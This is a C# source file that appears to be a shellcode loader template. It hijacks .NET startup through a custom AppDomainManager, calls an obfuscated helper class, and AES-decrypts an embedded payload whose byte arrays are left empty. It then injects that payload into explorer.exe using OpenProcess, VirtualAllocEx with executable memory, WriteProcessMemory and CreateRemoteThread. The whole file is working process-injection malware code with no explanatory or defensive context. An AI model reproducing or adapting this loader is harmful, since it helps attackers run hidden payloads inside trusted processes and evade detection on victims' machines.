using System;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using LHUemjWIqy;


			 
public sealed class MyAppDomainManager : AppDomainManager
{

    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
        bool res = ClassExample.Execute();
        return;
    }
}

public class ClassExample
{
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

		
	const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
		
		
    public static bool Execute()
        {
            LHUemjWIqy.uOYYm.RQNFbPpTg("100");
            Process[] expProc = Process.GetProcessesByName("explorer");
            int procPid = expProc[0].Id;
	    uint infiniteTimeout = 0xFFFFFFFF;
            byte[] passwordBytes = new byte[] { };
            byte[] saltBytes = new byte[] { };
            byte[] encryptedraw = new byte[] { };


            byte[] raw = Decryptraw(passwordBytes, saltBytes, encryptedraw);

            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, procPid);

            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)raw.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, raw, (uint)raw.Length, out bytesWritten);

            IntPtr hThread = CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
			WaitForSingleObject(procHandle, infiniteTimeout);
			return true;
        }

        static byte[] Decryptraw(byte[] passwordBytes, byte[] saltBytes, byte[] raw)
        {
            byte[] decryptedString;

            RijndaelManaged rj = new RijndaelManaged();

            try
            {
                rj.KeySize = 256;
                rj.BlockSize = 128;
                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                rj.Key = key.GetBytes(rj.KeySize / 8);
                rj.IV = key.GetBytes(rj.BlockSize / 8);
                rj.Mode = CipherMode.CBC;

                MemoryStream ms = new MemoryStream(raw);

                using (CryptoStream cs = new CryptoStream(ms, rj.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    cs.Read(raw, 0, raw.Length);
                    decryptedString = ms.ToArray();
                }
            }
            finally
            {
                rj.Clear();
            }

            return decryptedString;
        }


}
